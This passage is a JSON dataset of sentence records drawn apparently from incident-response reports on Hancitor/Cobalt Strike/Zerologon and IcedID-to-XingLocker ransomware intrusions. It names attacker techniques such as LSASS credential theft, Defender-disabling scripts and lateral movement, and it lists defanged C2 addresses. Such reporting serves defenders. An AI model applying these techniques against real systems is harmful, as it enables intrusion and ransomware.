        "index": 5876
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S62",
        "text": "A blog post by Blackberry can be referenced to learn more about this custom developed Zerologon file used: https://blogs.blackberry.com/en/2021/03/zerologon-to-ransomware.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 62,
        "index": 5877
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S63",
        "text": "For more information on detecting Zerologon check out Kroll\u2019s Zerologon Exploit Detect Cheat Sheet.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 63,
        "index": 5878
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S64",
        "text": "Upon Hancitor launching on the system, it process injected into multiple instances of svchost.exe and rundll32.exe.",
        "type": "",
        "report": "r-dfir-21",
        "line": 64,
        "index": 5879
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S65",
        "text": "Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.",
        "type": "",
        "report": "r-dfir-21",
        "line": 65,
        "index": 5880
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S66",
        "text": "Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 66,
        "index": 5881
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S67",
        "text": "Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.",
        "type": "",
        "report": "r-dfir-21",
        "line": 67,
        "index": 5882
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S68",
        "text": "In this case it is the number 11985756.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 68,
        "index": 5883
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S69",
        "text": "Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.",
        "type": "",
        "report": "r-dfir-21",
        "line": 69,
        "index": 5884
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S70",
        "text": "After many iterations, the script would deobfuscate and run-in memory.",
        "type": "",
        "report": "r-dfir-21",
        "line": 70,
        "index": 5885
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S71",
        "text": "The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.]32 for further instructions.",
        "type": "",
        "report": "r-dfir-21",
        "line": 71,
        "index": 5886
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S72",
        "text": "The only credential access observed was through Zerologon, which was used to retrieve the domain administrator\u2019s NTLM hash.",
        "type": "",
        "report": "r-dfir-21",
        "line": 72,
        "index": 5887
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S73",
        "text": "Discovery started with a port scan initiated by the Hancitor dll.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 73,
        "index": 5888
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S74",
        "text": "After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.",
        "type": "",
        "report": "r-dfir-21",
        "line": 74,
        "index": 5889
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S75",
        "text": "The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.",
        "type": "",
        "report": "r-dfir-21",
        "line": 75,
        "index": 5890
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S76",
        "text": "This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.",
        "type": "",
        "report": "r-dfir-21",
        "line": 76,
        "index": 5891
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S77",
        "text": "Notice above, the threat actors pinged 190.114.254[.]116 which is one of the Cobalt Strike servers they later used.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 77,
        "index": 5892
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S78",
        "text": "The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.",
        "type": "",
        "report": "r-dfir-21",
        "line": 78,
        "index": 5893
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S79",
        "text": "We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.",
        "type": "",
        "report": "r-dfir-21",
        "line": 79,
        "index": 5894
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S80",
        "text": "This script used the Active Directory RSAT module to get a list of computers and place them in a file named \u2018comps.txt.\u2019\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 80,
        "index": 5895
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S81",
        "text": "A program named check.exe was observed using the comps.txt text file.",
        "type": "",
        "report": "r-dfir-21",
        "line": 81,
        "index": 5896
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S82",
        "text": "This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.",
        "type": "",
        "report": "r-dfir-21",
        "line": 82,
        "index": 5897
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S83",
        "text": "The online hosts will then be directed to the check.txt text file.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 83,
        "index": 5898
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S84",
        "text": "The check.exe file contains three parameters that can be used one at a time:\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 84,
        "index": 5899
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S85",
        "text": "check .exe comps.txt check .txt -ip ( Check which hosts in comps.txt are alive, and write the IP to check .txt) check .exe comps.txt check .txt - name ( Check which hosts in comps.txt are alive, and write the hostname to check .txt) check .exe comps.txt check .txt - full ( Check which hosts in comps.txt are alive, and write the IP and hostname to check .txt)\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 85,
        "index": 5900
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S86",
        "text": "The threat actors pivoted towards multiple hosts on the domain from the beachhead.",
        "type": "",
        "report": "r-dfir-21",
        "line": 86,
        "index": 5901
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S87",
        "text": "The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).",
        "type": "",
        "report": "r-dfir-21",
        "line": 87,
        "index": 5902
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S88",
        "text": "Operators executed the batch script through a remotely created service on the target system.",
        "type": "",
        "report": "r-dfir-21",
        "line": 88,
        "index": 5903
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S89",
        "text": "The following shows one of the batch scripts used to run a Cobalt Strike payload.",
        "type": "",
        "report": "r-dfir-21",
        "line": 89,
        "index": 5904
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S90",
        "text": "An obfuscated PowerShell script named \u2018agent1.ps1\u2019 was dropped on a machine through a Cobalt Strike Beacon.",
        "type": "",
        "report": "r-dfir-21",
        "line": 90,
        "index": 5905
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S91",
        "text": "The PowerShell script had instructions to deobfuscate shellcode and run it in memory as a thread in the same PowerShell process.",
        "type": "",
        "report": "r-dfir-21",
        "line": 91,
        "index": 5906
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S92",
        "text": "The shellcode itself also has a PE file embedded inside of itself.",
        "type": "",
        "report": "r-dfir-21",
        "line": 92,
        "index": 5907
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S93",
        "text": "Once the shellcode is running this PE file will be loaded into memory and executed.",
        "type": "",
        "report": "r-dfir-21",
        "line": 93,
        "index": 5908
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S94",
        "text": "You can see this from the memory dump MZ header denoting the PE binary loaded into the PowerShell process.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 94,
        "index": 5909
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S95",
        "text": "The PE file is of a small size and has the capability to beacon out at regular intervals to a command-and-control server on 64.235.39[.]32 to retrieve instructions.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 95,
        "index": 5910
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S96",
        "text": "The Visual C# Command Line Compiler was observed being invoked by the PowerShell script where the shellcode was executed.",
        "type": "",
        "report": "r-dfir-21",
        "line": 96,
        "index": 5911
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S97",
        "text": "This is most likely instructions that the previously discussed PE file retrieved from the remote command and control server.",
        "type": "",
        "report": "r-dfir-21",
        "line": 97,
        "index": 5912
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S98",
        "text": "Hancitor contacted its servers over HTTP and advertised details about the compromised machine, user, and domain while also retrieving instructions from the command and control server (1).",
        "type": "",
        "report": "r-dfir-21",
        "line": 98,
        "index": 5913
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S99",
        "text": "From another dedicated location, 4a5ikol[.]ru, two Cobalt Strike beacons and Ficker Stealer malware were downloaded through HTTP (2).",
        "type": "",
        "report": "r-dfir-21",
        "line": 99,
        "index": 5914
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S100",
        "text": "A successful connection from Ficker Stealer was not observed.",
        "type": "",
        "report": "r-dfir-21",
        "line": 100,
        "index": 5915
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S101",
        "text": "A domain was queried; however, the response returned an error.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 101,
        "index": 5916
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S102",
        "text": "Cobalt Strike was also observed to be making use of HTTP.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 102,
        "index": 5917
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S103",
        "text": "Lastly, the shellcode executed by the agent1.ps1 PowerShell loader, was observed loading a PE file into memory that would beacon out at consistent intervals to 64.235.39[.]32.",
        "type": "",
        "report": "r-dfir-21",
        "line": 103,
        "index": 5918
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S104",
        "text": "Further encrypted network activity was also observed to this IP address.",
        "type": "",
        "report": "r-dfir-21",
        "line": 104,
        "index": 5919
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S105",
        "text": "Unfortunately, the tool sending these connections could not be definitively determined.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 105,
        "index": 5920
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S106",
        "text": "The user agent for this was curl/7.55.1\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 106,
        "index": 5921
    },
    {
        "id": "dfir-reports-filtered/r-dfir-21.md:::S107",
        "text": "Similar to a previous case, the threat actors were evicted before completing their mission and as a result their final actions could not be observed.\n",
        "type": "",
        "report": "r-dfir-21",
        "line": 107,
        "index": 5922
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S0",
        "text": "This case started with an IcedID infection from a malware campaign as reported by Myrtus.",
        "type": "",
        "report": "r-dfir-22",
        "line": 0,
        "index": 5923
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S1",
        "text": "As with most commodity malware we see, IcedID executes the initial discovery commands and then exfiltrates the results via the C2 channel.",
        "type": "",
        "report": "r-dfir-22",
        "line": 1,
        "index": 5924
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S2",
        "text": "If threat actors find the organization to be of interest, they will launch the next phase.",
        "type": "",
        "report": "r-dfir-22",
        "line": 2,
        "index": 5925
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S3",
        "text": "In some cases, there might be different threat actor groups working on different phases of the attack.",
        "type": "",
        "report": "r-dfir-22",
        "line": 3,
        "index": 5926
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S4",
        "text": "In this instance, the threat actors instructed IcedID to download and execute the next stage malware two hours after the initial compromise.",
        "type": "",
        "report": "r-dfir-22",
        "line": 4,
        "index": 5927
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S5",
        "text": "The payload was a Cobalt Strike Beacon in the form of a DLL.",
        "type": "",
        "report": "r-dfir-22",
        "line": 5,
        "index": 5928
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S6",
        "text": "Upon initial execution, Cobalt Strike ran some discovery commands before injecting into the LSASS process to steal cached credentials.",
        "type": "",
        "report": "r-dfir-22",
        "line": 6,
        "index": 5929
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S7",
        "text": "The threat actors did not waste any time, and within four minutes, they gained administrative credentials then began searching for the domain controllers.",
        "type": "",
        "report": "r-dfir-22",
        "line": 7,
        "index": 5930
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S8",
        "text": "Once the domain controllers were identified, they used Cobalt Strike\u2019s \u201cjump psexec_psh\u201d capability, which creates a Windows service that executes a Beacon executable to move laterally.",
        "type": "",
        "report": "r-dfir-22",
        "line": 8,
        "index": 5931
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S9",
        "text": "Having gained access to the domain controllers, the attackers downloaded and executed AdFind to collect further information about the domain.",
        "type": "",
        "report": "r-dfir-22",
        "line": 9,
        "index": 5932
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S10",
        "text": "The attacker\u2019s preferred scripting various parts of the intrusion via batch scripts.",
        "type": "",
        "report": "r-dfir-22",
        "line": 10,
        "index": 5933
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S11",
        "text": "They had a script for persistence, defense evasion and execution tasks.",
        "type": "",
        "report": "r-dfir-22",
        "line": 11,
        "index": 5934
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S12",
        "text": "A complete list of those scripts came from hxxps://styservice[.]com as we shared with the community in this tweet thread.",
        "type": "",
        "report": "r-dfir-22",
        "line": 12,
        "index": 5935
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S13",
        "text": "The first batch script we saw was to schedule a task which would execute a command to load a Cobalt Strike Beacon into memory using regsvr32.",
        "type": "",
        "report": "r-dfir-22",
        "line": 13,
        "index": 5936
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S14",
        "text": "This persistence mechanism was only seen on the domain controllers and one other critical server.",
        "type": "",
        "report": "r-dfir-22",
        "line": 14,
        "index": 5937
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S15",
        "text": "The lateral movement and execution of batch scripts continued with the operators expanding their network footprint.",
        "type": "",
        "report": "r-dfir-22",
        "line": 15,
        "index": 5938
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S16",
        "text": "It is worth mentioning that it appears they chose which hosts to pivot to by assessing the importance implied by their hostnames.",
        "type": "",
        "report": "r-dfir-22",
        "line": 16,
        "index": 5939
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S17",
        "text": "After landing on an \u201cimportant\u201d host, the first task was to execute various batch scripts to disable antivirus programs.",
        "type": "",
        "report": "r-dfir-22",
        "line": 17,
        "index": 5940
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S18",
        "text": "On one host, common backup utilities were also disabled.",
        "type": "",
        "report": "r-dfir-22",
        "line": 18,
        "index": 5941
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S19",
        "text": "Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network.",
        "type": "",
        "report": "r-dfir-22",
        "line": 19,
        "index": 5942
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S20",
        "text": "Despite that, they deployed another Beacon using a PowerShell loader method, this time on the beachhead.",
        "type": "",
        "report": "r-dfir-22",
        "line": 20,
        "index": 5943
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S21",
        "text": "They used this Beacon to run PowerView\u2019s Invoke-ShareFinder module in an effort to discover potentially interesting directories and files.",
        "type": "",
        "report": "r-dfir-22",
        "line": 21,
        "index": 5944
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S22",
        "text": "BloodHound was also executed as part their reconnaissance activities.",
        "type": "",
        "report": "r-dfir-22",
        "line": 22,
        "index": 5945
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S23",
        "text": "At the same time, the operators performed an exhaustive port scan on the servers they had earlier identified to be \u201cimportant\u201d.",
        "type": "",
        "report": "r-dfir-22",
        "line": 23,
        "index": 5946
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S24",
        "text": "Minutes away from meeting their final objective, the operators manually searched for files and directories of interest for the second time.",
        "type": "",
        "report": "r-dfir-22",
        "line": 24,
        "index": 5947
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S25",
        "text": "Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware.",
        "type": "",
        "report": "r-dfir-22",
        "line": 25,
        "index": 5948
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S26",
        "text": "The deployment took place via wmic and batch scripts.",
        "type": "",
        "report": "r-dfir-22",
        "line": 26,
        "index": 5949
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S27",
        "text": "We did not observe any overt exfiltration of data; however, it is possible that the threat actors used Cobalt Strike to transmit sensitive data.",
        "type": "",
        "report": "r-dfir-22",
        "line": 27,
        "index": 5950
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S28",
        "text": "The IcedID infection came as a result of a phishing campaign as reported by Myrtus on Twitter.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 28,
        "index": 5951
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S29",
        "text": "Initial IcedID was executed on the beachhead using regsvr32.exe\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 29,
        "index": 5952
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S30",
        "text": "Automated analysis of this IcedID sample extracts the following configuration for the staging server:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 30,
        "index": 5953
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S31",
        "text": "IcedID core analysis show additional C2 infrastructure as per this sample:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 31,
        "index": 5954
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S32",
        "text": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 32,
        "index": 5955
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S33",
        "text": "Below is a screenshot of packet where we can spot the GZIPLOADER downloading the first stage from the C2:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 33,
        "index": 5956
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S34",
        "text": "A detailed GZIPLOADER analysis from Binary Defense is available here.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 34,
        "index": 5957
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S35",
        "text": "The DLL was then executed using rundll32.exe one second later:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 35,
        "index": 5958
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S36",
        "text": "Cobalt strike Beacon DLLHost.exe was downloaded and loaded via process hollowing a few hours after the initial IcedID execution:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 36,
        "index": 5959
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S37",
        "text": "The threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon.",
        "type": "",
        "report": "r-dfir-22",
        "line": 37,
        "index": 5960
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S38",
        "text": "The threat actors then downloaded an additional Cobalt Strike Beacon kaslose.dll via curl and executed it via regsvr32 :\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 38,
        "index": 5961
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S39",
        "text": "The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 39,
        "index": 5962
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S40",
        "text": "Upon IcedID execution, a scheduled task named {3D0CCC72-D85D-7A63-8C0A-66CF5BAFD686} was created.",
        "type": "",
        "report": "r-dfir-22",
        "line": 40,
        "index": 5963
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S41",
        "text": "The task was scheduled to execute every hour:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 41,
        "index": 5964
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S42",
        "text": "The new scheduled task was registered under EID 106 as seen below.",
        "type": "",
        "report": "r-dfir-22",
        "line": 42,
        "index": 5965
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S43",
        "text": "(EIDs: 106,200,201 \u201cMicrosoft-Windows-TaskScheduler\\Operational.evtx\u201d)\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 43,
        "index": 5966
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S44",
        "text": "Correlating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 44,
        "index": 5967
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S45",
        "text": "While analyzing this intrusion, we observed further persistence via scheduled tasks associated with post-exploitation activities.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 45,
        "index": 5968
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S46",
        "text": "This scheduled task with name HpSupport executed a Cobalt Strike Beacon kaslose64.dll both on the Domain Controller and the File Server:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 46,
        "index": 5969
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S47",
        "text": "On the File Server, the same Scheduled task was created with a slightly different name:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 47,
        "index": 5970
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S48",
        "text": "The star.bat script contained the following lines in both cases:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 48,
        "index": 5971
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S49",
        "text": "IcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 49,
        "index": 5972
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S50",
        "text": "The threat actors executed a 1698 line batch script kasper.bat on a file server, which kills multiple processes using taskill, stops/disables several services using net stop and sc config and disables a number of security tools using WMI.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 50,
        "index": 5973
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S51",
        "text": "Here is an extract from the kasper.bat script:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 51,
        "index": 5974
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S52",
        "text": "Disabling Windows Defender using multiple techniques\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 52,
        "index": 5975
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S53",
        "text": "The threat actors executed three other scripts named fed1.bat , fed2.bat and fed3.bat using PowerShell and manipulating several registry keys to disable Windows Defender.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 53,
        "index": 5976
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S54",
        "text": "Content of fed1.bat script:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 54,
        "index": 5977
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S55",
        "text": "Content of fed2.bat script:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 55,
        "index": 5978
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S56",
        "text": "Content of fed3.bat script:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 56,
        "index": 5979
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S57",
        "text": "It appears that the information from these 3 scripts were lifted from the first revision of Revisions \u00b7 quick-disable-windows-defender.bat \u00b7 GitHub.",
        "type": "",
        "report": "r-dfir-22",
        "line": 57,
        "index": 5980
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S58",
        "text": "Fed1 is half of that batch file and Fed2 is the other half.",
        "type": "",
        "report": "r-dfir-22",
        "line": 58,
        "index": 5981
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S59",
        "text": "Fed3 is a complete copy.",
        "type": "",
        "report": "r-dfir-22",
        "line": 59,
        "index": 5982
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S60",
        "text": "This tells us that the threat actor was not aware of what was in these scripts or else they wouldn\u2019t have ran fed1/fed2 and fed3 considering they do the same thing.",
        "type": "",
        "report": "r-dfir-22",
        "line": 60,
        "index": 5983
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S61",
        "text": "The threat actors injected into a high privileged process and then access cached credentials from LSASS:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 61,
        "index": 5984
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S62",
        "text": "Related named pipe activity based on Cobalt Strike patterns for using Mimikatz Pass-The-Hash function to run local and remote commands.",
        "type": "",
        "report": "r-dfir-22",
        "line": 62,
        "index": 5985
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S63",
        "text": "The named pipe was used to pass the results back to the Beacon process.",
        "type": "",
        "report": "r-dfir-22",
        "line": 63,
        "index": 5986
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S64",
        "text": "Windows EID: 4673 \u2013 A privileged service was called:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 64,
        "index": 5987
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S65",
        "text": "Several discovery commands executed from IcedID after the initial execution:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 65,
        "index": 5988
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S66",
        "text": "Cobalt Strike\u2019s appino Beacon, ran discovery commands upon initial execution:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 66,
        "index": 5989
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S67",
        "text": "Discovering domain controllers prior to pivoting:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 67,
        "index": 5990
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S68",
        "text": "After discovering and pivoting to the Domain Controller, threat actors used both AdFind and BloodHound to explore the Active Directory Domain.",
        "type": "",
        "report": "r-dfir-22",
        "line": 68,
        "index": 5991
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S69",
        "text": "Executing Adfind on the Domain Controller:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 69,
        "index": 5992
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S70",
        "text": "Evidence of BloodHound execution on the Domain Controller:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 70,
        "index": 5993
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S71",
        "text": "The threat actors also executed PowerView Invoke-ShareFinder module on the beachhead host:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 71,
        "index": 5994
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S72",
        "text": "Decoded command:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 72,
        "index": 5995
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S73",
        "text": "The threat actors also executed PowerView Invoke-FindLocalAdminAccess module on one of the compromised servers:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 73,
        "index": 5996
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S74",
        "text": "Decoded command:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 74,
        "index": 5997
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S75",
        "text": "We also saw exhaustive port scanners of certain servers before additional discovery.\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 75,
        "index": 5998
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S76",
        "text": "File and Directory Discovery\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 76,
        "index": 5999
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S77",
        "text": "The following discovery commands were run on all hosts including the Domain Controllers:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 77,
        "index": 6000
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S78",
        "text": "The first Lateral Movement to the Domain Controller was performed using remote services creation (Executing spoolsv.exe via remote services):\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 78,
        "index": 6001
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S79",
        "text": "The spoolsv.exe binary is a Cobalt Strike artifact used for Lateral Movement and C2 which decodes to the configuration below:\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 79,
        "index": 6002
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S80",
        "text": "Additional Lateral Movement technique was observed, where the threat actors used Cobalt Strike\u2019s jump psexec_psh :\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 80,
        "index": 6003
    },
    {
        "id": "dfir-reports-filtered/r-dfir-22.md:::S81",
        "text": "Using Cyberchef (recipe), we decoded the obfuscated powershell loader, which is using the default named pipe \\.\\pipe\\status_f5 :\n",
        "type": "",
        "report": "r-dfir-22",
        "line": 81,
        "index": 6004
    },
    {
